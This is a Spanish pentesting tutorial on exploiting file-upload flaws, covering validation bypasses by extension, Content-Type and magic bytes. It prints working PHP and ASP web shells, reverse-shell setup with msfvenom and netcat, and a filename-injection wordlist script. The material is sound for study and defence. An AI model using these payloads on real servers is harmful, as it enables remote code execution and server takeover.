---
title: File Upload
date: 2025-11-11 11:00:00 +0000
categories: [Web, apuntes]
tags: [pentesting, web, File Upload]
image:
  path: /assets/img/posts/file-upload/cabecera.png
  alt: cabecera
description: >
   Subida de archivos

pin: false  
toc: true   
math: false 
mermaid: false 
---

La carga de archivos de usuario se ha convertido en una característica clave para la mayoría de las aplicaciones web modernas, ya que permite la extensibilidad de las aplicaciones web con información de los usuarios.

Sin embargo, al habilitar esta función, los desarrolladores de aplicaciones web también corren el riesgo de permitir que los usuarios finales almacenen datos potencialmente maliciosos en el servidor back-end de la aplicación web. Si la información introducida por el usuario y los archivos subidos no se filtran y validan correctamente, los atacantes pueden aprovechar la función de subida de archivos para realizar actividades maliciosas, como ejecutar comandos arbitrarios en el servidor back-end para tomar el control del mismo.

Las vulnerabilidades de carga de archivos se encuentran entre las más comunes en las aplicaciones web y móviles, como podemos ver en los últimos informes CVE. También observaremos que la mayoría de estas vulnerabilidades se califican como altas o críticas, lo que demuestra el nivel de riesgo que supone la carga de archivos insegura.

## Tipos de ataque

El peor tipo posible de vulnerabilidad en la carga de archivos es una vulnerabilidad en la carga de archivos arbitrarios no autenticados. Con este tipo de vulnerabilidad, una aplicación web permite a cualquier usuario no autenticado cargar cualquier tipo de archivo, lo que la sitúa a un paso de permitir que cualquier usuario ejecute código en el servidor back-end.

El ataque más común y crítico causado por la subida arbitraria de archivos es la ejecución remota de comandos en el servidor back-end mediante la subida de un shell web o de un script que envía un shell inverso. 

En algunos casos, es posible que no podamos realizar cargas de archivos arbitrarias y solo podamos cargar un tipo de archivo específico. Incluso en estos casos, existen varios ataques que podemos realizar para explotar la funcionalidad de carga de archivos si la aplicación web carece de ciertas protecciones de seguridad.

Algunos ejemplos de estos ataques son:

- Introducir otras vulnerabilidades como XSS o XXE.

- Provocar una denegación de servicio (DoS) en el servidor back-end.

- Sobrescribir archivos y configuraciones críticos del sistema.

Y muchos otros.

Por último, una vulnerabilidad en la carga de archivos no solo se debe a la escritura de funciones inseguras, sino que a menudo también se debe al uso de bibliotecas obsoletas que pueden ser vulnerables a estos ataques.

## Falta de validación

El tipo más básico de vulnerabilidad en la carga de archivos se produce cuando la aplicación web no cuenta con ningún tipo de filtro de validación en los archivos cargados, lo que permite la carga de cualquier tipo de archivo de forma predeterminada.

Con este tipo de aplicaciones web vulnerables, podemos cargar directamente nuestro script de shell web o shell inverso en la aplicación web y, a continuación, con solo visitar el script cargado, podemos interactuar con nuestro shell web o enviar el shell inverso.

### Subida de archivos arbitraria

Es la más básica y es la que nos permite subira archivos de cualquier tipo sin restricción.

### Identificación de frameworks web

Necesitamos cargar un script malicioso para comprobar si podemos cargar cualquier tipo de archivo en el servidor back-end y comprobar si podemos utilizarlo para explotar el servidor back-end. Hay muchos tipos de scripts que pueden ayudarnos a explotar aplicaciones web mediante la carga arbitraria de archivos, los más comunes son los scripts Web Shell y Reverse Shell.

Un Web Shell nos proporciona un método sencillo para interactuar con el servidor back-end, ya que acepta comandos shell y nos muestra su resultado en el navegador web. 

Un web shell debe estar escrito en el mismo lenguaje de programación que ejecuta el servidor web, ya que ejecuta funciones y comandos específicos de la plataforma para ejecutar comandos del sistema en el servidor back-end, lo que hace que los web shells no sean scripts multiplataforma. Por lo tanto, el primer paso sería identificar qué lenguaje ejecuta la aplicación web.

Esto suele ser relativamente sencillo, ya que a menudo podemos ver la extensión de la página web en las URL, lo que puede revelar el lenguaje de programación que ejecuta la aplicación web. Sin embargo, en ciertos marcos y lenguajes web, se utilizan rutas web para asignar URL a páginas web, en cuyo caso es posible que no se muestre la extensión de la página web. Además, la explotación de la carga de archivos también sería diferente, ya que es posible que nuestros archivos cargados no sean directamente enrutables o accesibles.

Un método sencillo para determinar qué lenguaje ejecuta la aplicación web es visitar la página /index.ext, donde sustituiríamos ext por varias extensiones web comunes, como php, asp, aspx, entre otras, para ver si alguna de ellas existe.

Existen otras técnicas que pueden ayudar a identificar las tecnologías que ejecutan la aplicación web, como el uso de la extensión Wappalyzer, disponible para todos los principales navegadores. 

![image](/assets/img/posts/file-upload/20251110194043.png)

Como podemos ver, la extensión no solo nos indicó que la aplicación web se ejecuta en PHP, sino que también identificó el tipo y la versión del servidor web, el sistema operativo back-end y otras tecnologías en uso.
  
También podemos ejecutar escáneres web para identificar el marco web, como los escáneres Burp/ZAP u otras herramientas de evaluación de vulnerabilidades web. Al final, una vez que identificamos el lenguaje en el que se ejecuta la aplicación web, podemos cargar un script malicioso escrito en el mismo lenguaje para explotar la aplicación web y obtener el control remoto del servidor back-end.


## Explotación

### Web shells

En Internet podemos encontrar muchas webshells excelentes que ofrecen funciones útiles, como el recorrido de directorios o la transferencia de archivos. Una buena opción para PHP es phpbash, que proporciona una webshell semiinteractiva similar a un terminal.

Podemos descargar cualquiera de estas webshells para el lenguaje de nuestra aplicación web (PHP en nuestro caso), luego subirla a través de la función de carga vulnerable y visitar el archivo subido para interactuar con la webshell. 

![image](/assets/img/posts/file-upload/20251110202549.png)

Como podemos ver, este shell web ofrece una experiencia similar a la de un terminal, lo que facilita enormemente la enumeración del servidor back-end para su posterior explotación. 


### WebShell personalizado

Aunque el uso de shells web de recursos en línea puede proporcionar una gran experiencia, también debemos saber cómo escribir un shell web sencillo manualmente. Esto se debe a que es posible que no tengamos acceso a herramientas en línea durante algunas pruebas de penetración, por lo que debemos ser capaces de crear uno cuando sea necesario.

Por ejemplo, con las aplicaciones web PHP, podemos utilizar la función system() que ejecuta comandos del sistema e imprime su salida, y pasarle el parámetro cmd con `$_REQUEST[“cmd”]`

```php
<?php system($_REQUEST['cmd']); ?>
```

Si escribimos el script anterior en shell.php y lo subimos a nuestra aplicación web, podemos ejecutar comandos del sistema con el parámetro GET ?cmd= (por ejemplo, ?cmd=id).


Puede que no sea tan fácil de usar como otros shells web que podemos encontrar en línea, pero sigue ofreciendo un método interactivo para enviar comandos y recuperar sus resultados. Podría ser la única opción disponible durante algunas pruebas de penetración web.

Si utilizamos este shell web personalizado en un navegador, lo mejor es utilizar la vista de código fuente pulsando [CTRL+U], ya que la vista de código fuente muestra el resultado del comando tal y como se mostraría en el terminal, sin ningún tipo de renderización HTML que pueda afectar al formato del resultado.

  
Los shells web no son exclusivos de PHP, y lo mismo se aplica a otros marcos web, con la única diferencia de las funciones utilizadas para ejecutar los comandos del sistema. Para las aplicaciones web .NET, podemos pasar el parámetro cmd con request(“cmd”) a la función eval(), y también debería ejecutar el comando especificado en ?cmd= e imprimir su salida.

```asp
<% eval request('cmd') %>
```

Podemos encontrar otras webshells en Internet, muchas de las cuales se pueden memorizar fácilmente para realizar pruebas de penetración web. Cabe señalar que, en determinados casos, las webshells pueden no funcionar. Esto puede deberse a que el servidor web impide el uso de algunas funciones utilizadas por la webshell (por ejemplo, system()), o a un firewall de aplicaciones web, entre otras razones. En estos casos, es posible que tengamos que utilizar técnicas avanzadas para eludir estas medidas de seguridad.


### Reverse shell

Un shell inverso fiable para PHP es el shell inverso PHP pentestmonkey. 

Cambiamos la ip a la de nuestra maquina.

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Abrimos un puerto de escucha.

```shell-session
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Generación de reverse shell

Aunque es posible utilizar la misma función del sistema anterior y pasarle un comando de shell inverso, esto puede no ser siempre muy fiable, ya que el comando puede fallar por muchas razones, al igual que cualquier otro comando de shell inverso.

Por eso siempre es mejor utilizar las funciones básicas del marco web para conectarnos a nuestra máquina. Sin embargo, esto puede no ser tan fácil de memorizar como un script de shell web. Afortunadamente, herramientas como msfvenom pueden generar un script de shell inverso en muchos lenguajes e incluso pueden intentar eludir ciertas restricciones existentes. 

```shell-session
$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

```shell-session
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Del mismo modo, podemos generar scripts de shell inverso para varios lenguajes. Podemos utilizar muchas cargas útiles de shell inverso con el indicador -p y especificar el lenguaje de salida con el indicador -f.

Aunque los shells inversos siempre son preferibles a los shells web, ya que proporcionan el método más interactivo para controlar el servidor comprometido, es posible que no siempre funcionen y que tengamos que recurrir a los shells web. Esto puede deberse a varias razones, como la existencia de un cortafuegos en la red back-end que impida las conexiones salientes o que el servidor web desactive las funciones necesarias para iniciar una conexión con nosotros.

## Validación en el lado de cliente

Muchas aplicaciones web solo utilizan código JavaScript front-end para validar el formato del archivo seleccionado antes de subirlo y no lo subirían si el archivo no tuviera el formato requerido (por ejemplo, si no fuera una imagen).

Sin embargo, como la validación del formato de archivo se realiza en el lado del cliente, podemos eludirla fácilmente interactuando directamente con el servidor y omitiendo por completo las validaciones front-end. También podemos modificar el código front-end a través de las herramientas de desarrollo de nuestro navegador para desactivar cualquier validación existente.

Aún podemos seleccionar la opción Todos los archivos para seleccionar nuestro script PHP, pero al hacerlo, aparece un mensaje de error que dice (¡Solo se permiten imágenes!) y el botón Cargar se desactiva.

![image](/assets/img/posts/file-upload/20251110211016.png)

Esto indica algún tipo de validación del tipo de archivo, por lo que no podemos simplemente cargar un shell web a través del formulario de carga como hicimos antes. Afortunadamente, toda la validación parece realizarse en el front-end, ya que la página nunca se actualiza ni envía ninguna solicitud HTTP después de seleccionar nuestro archivo. Por lo tanto, deberíamos poder tener un control total sobre estas validaciones del lado del cliente.


Cualquier código que se ejecute en el lado del cliente está bajo nuestro control. Aunque el servidor web es responsable de enviar el código del front-end, la representación y la ejecución del código del front-end se producen dentro de nuestro navegador. Si la aplicación web no aplica ninguna de estas validaciones en el back-end, deberíamos poder cargar cualquier tipo de archivo.


### Modificación de petición en el back-end

Comencemos por examinar una solicitud normal a través de Burp. Cuando seleccionamos una imagen, vemos que se refleja como nuestra imagen de perfil, y cuando hacemos clic en «Subir», nuestra imagen de perfil se actualiza y permanece tras las actualizaciones. Esto indica que nuestra imagen se ha subido al servidor, que ahora nos la muestra.

![image](/assets/img/posts/file-upload/20251110211423.png)

La aplicación web parece estar enviando una solicitud de carga HTTP estándar a /upload.php. De esta manera, ahora podemos modificar esta solicitud para satisfacer nuestras necesidades sin tener las restricciones de validación de tipo del front-end. Si el servidor back-end no valida el tipo de archivo cargado, entonces, en teoría, deberíamos poder enviar cualquier tipo de archivo/contenido, y se cargaría en el servidor.

Las dos partes importantes de la solicitud son filename="HTB.png" y el contenido del archivo al final de la solicitud. Si modificamos el nombre del archivo a shell.php y modificamos el contenido al shell web que utilizamos en la sección anterior, estaríamos subiendo un shell web PHP en lugar de una imagen.

![image](/assets/img/posts/file-upload/20251110212745.png)

También podemos modificar el tipo de contenido del archivo cargado, aunque esto no debería tener mucha importancia en esta fase, por lo que lo dejaremos sin modificar.

Como podemos ver, nuestra solicitud de carga se ha procesado y hemos obtenido el mensaje «Archivo cargado correctamente» en la respuesta. Por lo tanto, ahora podemos visitar nuestro archivo cargado, interactuar con él y obtener la ejecución remota de código.


### Deshabilitar la validación en el front-end

Otro método para eludir las validaciones del lado del cliente es manipular el código front-end. Dado que estas funciones se procesan completamente dentro de nuestro navegador web, tenemos control total sobre ellas. Por lo tanto, podemos modificar estos scripts o desactivarlos por completo. A continuación, podemos utilizar la función de carga para cargar cualquier tipo de archivo sin necesidad de utilizar Burp para capturar y modificar nuestras solicitudes.

Para empezar, podemos hacer clic en `[CTRL+MAYÚS+C]` para activar el inspector de páginas del navegador y, a continuación, hacer clic en la imagen de perfil, que es donde activamos el selector de archivos para el formulario de carga.

![image](/assets/img/posts/file-upload/20251110213048.png)

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Aquí vemos que la entrada de archivo especifica (.jpg, .jpeg, .png) como los tipos de archivo permitidos en el cuadro de diálogo de selección de archivos. Sin embargo, podemos modificar esto fácilmente y seleccionar "**Todos los archivos**" como hicimos antes, por lo que no es necesario cambiar esta parte de la página.

La parte más interesante es onchange="checkFile(this)", que parece ejecutar un código JavaScript cada vez que seleccionamos un archivo, lo que parece estar realizando la validación del tipo de archivo. Para obtener los detalles de esta función, podemos ir a la consola del navegador haciendo clic en `[CTRL+MAYÚS+K]` y, a continuación, podemos escribir el nombre de la función (checkFile) para obtener sus detalles.

  
```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

Lo más importante que podemos extraer de esta función es que comprueba si la extensión del archivo es una imagen y, si no lo es, muestra el mensaje de error que hemos visto anteriormente (¡Solo se permiten imágenes!) y desactiva el botón Subir. Podemos añadir PHP como una de las extensiones permitidas o modificar la función para eliminar la comprobación de la extensión.

Afortunadamente, no necesitamos escribir ni modificar código JavaScript. Podemos eliminar esta función del código HTML, ya que su uso principal parece ser la validación del tipo de archivo, y eliminarla no debería causar ningún problema.

Para ello, podemos volver a nuestro inspector, hacer clic de nuevo en la imagen de perfil, hacer doble clic en el nombre de la función (checkFile) en la línea 18 y eliminarla.

![image](/assets/img/posts/file-upload/20251110213313.png)

Una vez eliminada la función checkFile de la entrada de archivos, deberíamos poder seleccionar nuestro shell web PHP a través del cuadro de diálogo de selección de archivos y cargarlo normalmente sin validaciones, de forma similar a lo que hicimos en la sección anterior.

La modificación que hemos realizado en el código fuente es temporal y no se mantendrá tras las actualizaciones de la página, ya que solo la estamos cambiando en el lado del cliente. Sin embargo, nuestra única necesidad es eludir la validación del lado del cliente, por lo que debería ser suficiente para este propósito.

Una vez que subimos nuestro shell web utilizando cualquiera de los métodos anteriores y luego actualizamos la página, podemos utilizar el Inspector de páginas una vez más, hacer clic en la imagen de perfil y deberíamos ver la URL de nuestro shell web subido.

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```


## Filtros Blacklist

Si los controles de validación de tipos en el servidor back-end no se codificaron de forma segura, un atacante puede utilizar múltiples técnicas para eludirlos y acceder a las cargas de archivos PHP.

Este caso es similar al que vimos antes, pero tiene una lista negra de extensiones no permitidas para evitar la carga de scripts web. Veremos por qué el uso de una lista negra de extensiones comunes puede no ser suficiente para evitar la carga arbitraria de archivos y discutiremos varios métodos para eludirla.

### Extensiones de blacklist

Comencemos probando uno de los métodos de omisión del lado del cliente que aprendimos en la sección anterior para cargar un script PHP en el servidor back-end. Interceptaremos una solicitud de carga de imagen con Burp, reemplazaremos el contenido y el nombre del archivo con nuestro script PHP y reenviaremos la solicitud.

![image](/assets/img/posts/file-upload/20251110220802.png)

Como podemos ver, nuestro ataque no tuvo éxito esta vez, ya que obtuvimos el mensaje «Extensión no permitida». Esto indica que la aplicación web puede tener algún tipo de validación de tipo de archivo en el back-end, además de las validaciones del front-end.

Por lo general, hay dos formas comunes de validar una extensión de archivo en el back-end:

- Comprobación con una blacklist de tipos
- Comprobación con una whitelist de tipos

Además, la validación también puede comprobar el tipo de archivo o el contenido del archivo para ver si coincide con el tipo. La forma más débil de validación entre estas es comprobar la extensión del archivo con una lista negra de extensiones para determinar si se debe bloquear la solicitud de carga. 
Por ejemplo, el siguiente fragmento de código comprueba si la extensión del archivo cargado es PHP y rechaza la solicitud si lo es.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

El código toma la extensión del archivo (`$extension`) del nombre del archivo subido (`$fileName`) y luego la compara con una lista de extensiones incluidas en la blacklist ($blacklist).

Sin embargo, este método de validación tiene un defecto importante. No es exhaustivo, ya que hay muchas otras extensiones que no están incluidas en esta lista y que, si se suben, podrían utilizarse para ejecutar código PHP en el servidor back-end.

La comparación anterior también distingue entre mayúsculas y minúsculas, y solo tiene en cuenta las extensiones en minúsculas. En los servidores Windows, los nombres de los archivos no distinguen entre mayúsculas y minúsculas, por lo que podemos intentar subir un php con mayúsculas y minúsculas mezcladas (por ejemplo, pHp), que también puede eludir la lista negra y seguir ejecutándose como un script PHP.


### Fuzzing de extensiones

Dado que la aplicación web parece estar probando la extensión del archivo, nuestro primer paso es realizar un fuzzing de la funcionalidad de carga con una lista de extensiones potenciales y ver cuáles de ellas devuelven el mensaje de error anterior. Cualquier solicitud de carga que no devuelva un mensaje de error, devuelva un mensaje diferente o consiga cargar el archivo, puede indicar una extensión de archivo permitida.

Hay muchas listas de extensiones que podemos utilizar en nuestro escaneo de fuzzing. **PayloadsAllTheThings** proporciona listas de extensiones para aplicaciones web PHP y .NET. También podemos utilizar la lista de extensiones web comunes de SecLists.


Como estamos probando una aplicación PHP, descargaremos y utilizaremos la lista PHP anterior. A continuación, desde el historial de Burp, podemos localizar nuestra última solicitud a /**upload**.php.

![image](/assets/img/posts/file-upload/20251110221704.png)

Mantendremos el contenido del archivo para este ataque, ya que solo nos interesa el fuzzing de extensiones de archivo. Por último, podemos cargar la lista de extensiones PHP anterior en la pestaña Payloads, dentro de Payload Options. También desmarcaremos la opción URL Encoding para evitar codificar el (.) antes de la extensión del archivo. Una vez hecho esto, podemos hacer clic en Start Attack para iniciar el fuzzing de las extensiones de archivo que no están en la blacklist.

![image](/assets/img/posts/file-upload/20251110221753.png)

### Extensiones fuera de la blacklist

Ahora, podemos intentar cargar un archivo utilizando cualquiera de las extensiones permitidas de arriba, y algunas de ellas pueden permitirnos ejecutar código PHP. No todas las extensiones funcionarán con todas las configuraciones de servidor web, por lo que es posible que tengamos que probar varias extensiones hasta encontrar una que ejecute correctamente el código PHP.

Usemos la extensión .phtml, que los servidores web PHP suelen permitir para los derechos de ejecución de código. 

Podemos hacer clic con el botón derecho del ratón en su solicitud en los resultados de Intruder y seleccionar Enviar a repetidor. Ahora, todo lo que tenemos que hacer es repetir lo que hemos hecho en las dos secciones anteriores cambiando el nombre del archivo para usar la extensión .phtml y cambiando el contenido por el de un shell web PHP.

![image](/assets/img/posts/file-upload/20251110221903.png)

## Filtros Whitelist

Consiste en utilizar una whitelist de extensiones de archivo permitidas. Una whitelist suele ser más segura que una blacklist. El servidor web solo permitiría las extensiones especificadas y la lista no tendría que ser exhaustiva para cubrir extensiones poco comunes.

No obstante, existen diferentes casos de uso para una lista negra y para una lista blanca. Una lista negra puede ser útil en los casos en que la función de carga debe permitir una amplia variedad de tipos de archivos (por ejemplo, el Administrador de archivos), mientras que una lista blanca solo se suele utilizar con funciones de carga en las que solo se permiten unos pocos tipos de archivos. Ambas también se pueden utilizar conjuntamente.

A continuación se muestra un ejemplo de prueba de lista blanca de extensiones de archivo:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Vemos que el script utiliza una expresión regular (regex) para comprobar si el nombre del archivo contiene alguna extensión de imagen incluida en la lista blanca. El problema aquí radica en la expresión regular, ya que solo comprueba si el nombre del archivo contiene la extensión y no si realmente termina con ella. Muchos desarrolladores cometen este tipo de errores debido a su escaso conocimiento de los patrones de expresiones regulares.

Veamos, pues, cómo podemos eludir estas comprobaciones para subir scripts PHP.

### Extensiones dobles

El código solo comprueba si el nombre del archivo contiene una extensión de imagen; un método sencillo para superar la prueba de expresiones regulares es utilizar extensiones dobles. Por ejemplo, si se permite la extensión .jpg, podemos añadirla al nombre del archivo que subimos y seguir terminando el nombre del archivo con .php (por ejemplo, shell.jpg.php), en cuyo caso deberíamos poder superar la prueba de la lista blanca, al tiempo que seguimos subiendo un script PHP que puede ejecutar código PHP.

Sin embargo, esto puede no funcionar siempre, ya que algunas aplicaciones web pueden utilizar un patrón de expresión regular estricto, como se ha mencionado anteriormente, como el siguiente;

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

Este patrón solo debe tener en cuenta la extensión final del archivo, ya que utiliza (^.\.) para buscar todo lo que hay hasta el último (.), y luego utiliza ($) al final para buscar solo las extensiones que terminan el nombre del archivo. Por lo tanto, el ataque anterior no funcionaría. No obstante, algunas técnicas de explotación pueden permitirnos eludir este patrón, pero la mayoría se basan en configuraciones incorrectas o sistemas obsoletos.


### Extensión doble inversa

En algunos casos, es posible que la funcionalidad de carga de archivos en sí misma no sea vulnerable, pero la configuración del servidor web puede dar lugar a una vulnerabilidad. Por ejemplo, una organización puede utilizar una aplicación web de código abierto que tenga una funcionalidad de carga de archivos. Incluso si la funcionalidad de carga de archivos utiliza un patrón de expresión regular estricto que solo coincide con la extensión final del nombre del archivo, la organización puede utilizar configuraciones inseguras para el servidor web.

Por ejemplo, el archivo /etc/apache2/mods-enabled/php7.4.conf del servidor web Apache2 puede incluir la siguiente configuración:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

La configuración anterior es la forma en que el servidor web determina qué archivos permiten la ejecución de código PHP. Especifica una lista blanca con un patrón de expresión regular que coincide con .phar, .php y .phtml. Sin embargo, este patrón de expresión regular puede tener el mismo error que vimos anteriormente si olvidamos terminarlo con ($). En tales casos, cualquier archivo que contenga las extensiones anteriores podrá ejecutar código PHP, incluso si no termina con la extensión PHP. Por ejemplo, el nombre del archivo (shell.php.jpg) debería pasar la prueba de la lista blanca anterior, ya que termina con (.jpg), y podría ejecutar código PHP debido a la configuración incorrecta anterior, ya que contiene (.php) en su nombre.

### Inyección de carácteres

 Podemos inyectar varios caracteres antes o después de la extensión final para que la aplicación web interprete erróneamente el nombre del archivo y ejecute el archivo cargado como un script PHP.

Estos son algunos de los caracteres que podemos intentar inyectar:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Cada carácter tiene un caso de uso específico que puede engañar a la aplicación web para que interprete erróneamente la extensión del archivo. Por ejemplo, (shell.php%00.jpg) funciona con servidores PHP con la versión 5.X o anterior, ya que hace que el servidor web PHP termine el nombre del archivo después de (%00) y lo almacene como (shell.php), sin dejar de pasar la lista blanca. Lo mismo se puede utilizar con aplicaciones web alojadas en un servidor Windows inyectando dos puntos (:) antes de la extensión de archivo permitida (por ejemplo, shell.aspx:.jpg), lo que también debería escribir el archivo como (shell.aspx). Del mismo modo, cada uno de los demás caracteres tiene un caso de uso que puede permitirnos cargar un script PHP sin pasar la prueba de validación de tipo.

Podemos escribir un pequeño script bash que genere todas las permutaciones del nombre del archivo, donde los caracteres anteriores se inyectarían antes y después de las extensiones PHP y JPG.

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Con esta lista de palabras personalizada, podemos ejecutar un análisis de fuzzing con Burp Intruder, similar a los que hicimos anteriormente. Si el back-end o el servidor web están desactualizados o tienen ciertas configuraciones incorrectas, algunos de los nombres de archivo generados pueden eludir la prueba de la lista blanca y ejecutar código PHP.

![image](/assets/img/posts/file-upload/20251111204334.png)

## Type filters

Muchos servidores web y aplicaciones web modernos también comprueban el contenido del archivo cargado para asegurarse de que coincide con el tipo especificado. Mientras que los filtros de extensión pueden aceptar varias extensiones, los filtros de contenido suelen especificar una sola categoría (por ejemplo, imágenes, vídeos, documentos), por lo que no suelen utilizar listas negras o blancas. Esto se debe a que los servidores web proporcionan funciones para comprobar el tipo de contenido del archivo, y este suele pertenecer a una categoría específica.
  
Existen dos métodos comunes para validar el contenido del archivo: el encabezado Content-Type o el contenido del archivo.

### Content-Type

![image](/assets/img/posts/file-upload/20251111204937.png)

Vemos que aparece un mensaje que dice «Solo se permiten imágenes». El mensaje de error persiste y nuestro archivo no se carga.
Si cambiamos el nombre del archivo a shell.jpg.phtml o shell.php.jpg, o incluso si utilizamos shell.jpg con contenido de shell web, la carga fallará. Dado que la extensión del archivo no afecta al mensaje de error, la aplicación web debe estar comprobando el contenido del archivo para validar el tipo. Como se ha mencionado anteriormente, esto puede hacerse en el encabezado Content-Type o en el contenido del archivo.

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

El código establece la variable ($type) a partir del encabezado Content-Type del archivo cargado. Nuestros navegadores establecen automáticamente el encabezado Content-Type al seleccionar un archivo a través del cuadro de diálogo del selector de archivos, normalmente derivado de la extensión del archivo. Sin embargo, dado que nuestros navegadores lo establecen, esta operación es una operación del lado del cliente, y podemos manipularla para cambiar el tipo de archivo percibido y, potencialmente, eludir el filtro de tipo.

Podemos empezar por difuminar el encabezado Content-Type con la lista de palabras Content-Type de SecLists a través de Burp Intruder, para ver qué tipos están permitidos. Sin embargo, el mensaje nos indica que solo se permiten imágenes, por lo que podemos limitar nuestro escaneo a los tipos de imagen, lo que reduce la lista de palabras a solo 45 tipos (en comparación con los 700 originales).

```shell-session
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt

$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

![image](/assets/img/posts/file-upload/20251111205245.png)

Una solicitud HTTP de carga de archivos tiene dos encabezados Content-Type, uno para el archivo adjunto (en la parte inferior) y otro para la solicitud completa (en la parte superior). Normalmente necesitamos modificar el encabezado Content-Type del archivo, pero en algunos casos la solicitud solo contendrá el encabezado Content-Type principal (por ejemplo, si el contenido cargado se envió como datos POST), en cuyo caso tendremos que modificar el encabezado Content-Type principal.

### MIME-Type

El segundo tipo de validación de contenido de archivos, y el más común, consiste en comprobar el tipo MIME del archivo cargado. Las extensiones multipropósito de correo electrónico (MIME) son un estándar de Internet que determina el tipo de un archivo a través de su formato general y la estructura de sus bytes.

Esto se suele hacer inspeccionando los primeros bytes del contenido del archivo, que contienen la firma del archivo o los bytes mágicos. Por ejemplo, si un archivo comienza con (GIF87a o GIF89a), esto indica que se trata de una imagen GIF, mientras que un archivo que comienza con texto sin formato suele considerarse un archivo de texto. Si cambiamos los primeros bytes de cualquier archivo por los bytes mágicos GIF, su tipo MIME se cambiaría a una imagen GIF, independientemente de su contenido restante o extensión.

Muchos otros tipos de imágenes tienen bytes no imprimibles para sus firmas de archivo, mientras que una imagen GIF comienza con bytes imprimibles ASCII (como se muestra arriba), por lo que es la más fácil de imitar. Además, como la cadena GIF8 es común entre ambas firmas GIF, suele ser suficiente para imitar una imagen GIF.

Veamos un ejemplo básico para demostrarlo. El comando file en los sistemas Unix encuentra el tipo de archivo a través del tipo MIME.

```shell-session
$ echo "this is a text file" > text.jpg 
$ file text.jpg 
text.jpg: ASCII text
```

Como vemos, el tipo MIME del archivo es texto ASCII, aunque su extensión sea .jpg. Sin embargo, si escribimos GIF8 al principio del archivo, se considerará una imagen GIF, aunque su extensión siga siendo .jpg

```shell-session
$ echo "GIF8" > text.jpg 
$ file text.jpg
text.jpg: GIF image data
```

Los servidores web también pueden utilizar este estándar para determinar los tipos de archivo, lo que suele ser más preciso que comprobar la extensión del archivo.

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Como podemos ver, los tipos MIME son similares a los que se encuentran en los encabezados Content-Type, pero su origen es diferente, ya que PHP utiliza la función mime_content_type() para obtener el tipo MIME de un archivo.

![image](/assets/img/posts/file-upload/20251111210112.png)

Podemos utilizar una combinación de los dos métodos descritos, lo que puede ayudarnos a eludir algunos filtros de contenido más robustos. Por ejemplo, podemos intentar utilizar un tipo MIME permitido con un tipo de contenido no permitido, un tipo MIME/contenido permitido con una extensión no permitida, o un tipo MIME/contenido no permitido con una extensión permitida, etc. Del mismo modo, podemos probar otras combinaciones y permutaciones para intentar confundir al servidor web y, dependiendo del nivel de seguridad del código, es posible que podamos eludir varios filtros.

![image](/assets/img/posts/file-upload/20251111210619.png)


## Subida de archivos limitada

Si bien los formularios de carga de archivos con filtros débiles pueden explotarse para cargar archivos arbitrarios, algunos formularios de carga tienen filtros seguros que pueden no ser explotables. Sin embargo, incluso si nos enfrentamos a un formulario de carga de archivos limitado (es decir, no arbitrario), que solo nos permite cargar tipos de archivos específicos, es posible que aún podamos realizar algunos ataques a la aplicación web.

Ciertos tipos de archivos, como SVG, HTML, XML e incluso algunos archivos de imagen y documento, pueden permitirnos introducir nuevas vulnerabilidades en la aplicación web mediante la carga de versiones maliciosas de estos archivos. Por eso, el fuzzing de las extensiones de archivo permitidas es un ejercicio importante para cualquier ataque de carga de archivos. Nos permite explorar qué ataques se pueden llevar a cabo en el servidor web. Veamos algunos de estos ataques.

### XSS

Muchos tipos de archivos nos permiten introducir una vulnerabilidad Stored XSS en la aplicación web mediante la carga de versiones maliciosas de los mismos.

El ejemplo más básico es cuando una aplicación web nos permite cargar archivos HTML. Aunque los archivos HTML no nos permiten ejecutar código (por ejemplo, PHP), sí que sería posible implementar código JavaScript en ellos para llevar a cabo un ataque XSS o CSRF contra cualquiera que visite la página HTML cargada. Si el objetivo ve un enlace de un sitio web en el que confía y el sitio web es vulnerable a la carga de documentos HTML, es posible engañarlo para que visite el enlace y llevar a cabo el ataque en sus equipos.

